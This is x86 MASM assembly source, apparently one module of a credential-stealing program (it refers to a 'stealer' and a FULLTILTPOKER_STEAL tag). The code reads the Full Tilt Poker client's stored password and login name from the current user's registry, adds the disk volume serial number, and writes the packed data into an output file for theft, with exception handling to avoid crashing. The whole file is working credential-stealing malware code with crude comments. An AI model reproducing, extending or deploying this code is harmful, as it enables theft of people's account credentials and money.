      
.data?
      futp_buf1        db  200h dup (?)
      futp_buf2        db  200h dup (?)
      futp_buf3        db  200h dup (?)
      futp_dwVolId     dd  ?
      
     
.code

GetFullTiltPokerPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], FULLTILTPOKER_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetFullTiltPokerPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      call    GetFuTP_Shit
      
    GetFullTiltPokerPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetFullTiltPokerPwd endp

GetFuTP_Shit proc uses ebx
      LOCAL   pwd_size:DWORD
      LOCAL   login_size:DWORD
      LOCAL   total_size:DWORD
      LOCAL   hFUTP:DWORD
      LOCAL   total_index:DWORD
      LOCAL   t:DWORD
      
      invoke  RegRead, HKEY_CURRENT_USER, addr futp_reg_path1, addr futp_reg_val1, addr futp_buf1, sizeof futp_buf1, REG_READ_A
      .if     eax != 0
              mov     pwd_size, eax
              invoke  RegRead, HKEY_CURRENT_USER, addr futp_reg_path1, addr futp_reg_val2, addr futp_buf2, sizeof futp_buf2, REG_READ_A
              .if     eax != 0
                      mov     login_size, eax
                      GetWindowsDirectory, addr futp_buf3, sizeof futp_buf3
                      push    offset futp_reg_check
                      call    CheckInInstalledList
                      .if     eax != 0
                              lstrcpy, addr futp_buf3, eax
                      .endif
                      mov     byte ptr [futp_buf3+3], 0
                      
                      GetVolumeInformation, addr futp_buf3, 0, 0, addr futp_dwVolId, 0, 0, 0, 0
                      .if     eax == FALSE
                              ; call failed
                              mov     t, 00FF00FFh
                      .else
                              ; call successed
                              mov     eax, futp_dwVolId
                              and     eax, 0000FFFFh
                              mov     t, eax
                              
                      .endif
                      ; write this bitches down!
                      mov     ebx, pwd_size
                      add     ebx, sizeof pwd_size
                      add     ebx, login_size
                      add     ebx, sizeof login_size
                      add     ebx, sizeof futp_dwVolId
                      add     ebx, sizeof t
                      mov     total_size, ebx
                      
                      HeapAlloc, hHeap, HEAP_ZERO_MEMORY, total_size
                      test    eax, eax
                      je      futp_totally_no_data_in_this_bitch
                      mov     hFUTP, eax
                      mov     total_index, eax
                      
                      RtlMoveMemory, total_index, addr pwd_size, sizeof pwd_size
                      add     total_index, sizeof pwd_size
                      RtlMoveMemory, total_index, addr futp_buf1, pwd_size
                      mov     eax, pwd_size
                      add     total_index, eax
                      
                      RtlMoveMemory, total_index, addr login_size, sizeof login_size
                      add     total_index, sizeof login_size
                      RtlMoveMemory, total_index, addr futp_buf2, login_size
                      mov     eax, login_size
                      add     total_index, eax
                      
                      RtlMoveMemory, total_index, addr futp_dwVolId, sizeof futp_dwVolId
                      add     total_index, sizeof futp_dwVolId
                      
                      RtlMoveMemory, total_index, addr t, sizeof t
                      add     total_index, sizeof t
                      
                      add     dword ptr [DataSize], sizeof total_size
                      WriteFile, stfile, addr total_size, sizeof total_size, addr SNW, NULL
                      mov     eax, dword ptr [total_size]
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, hFUTP, total_size, addr SNW, NULL
                      
                      HeapFree, hHeap, 0, hFUTP
              .endif
      .endif
      
    futp_totally_no_data_in_this_bitch:
      ret
GetFuTP_Shit endp


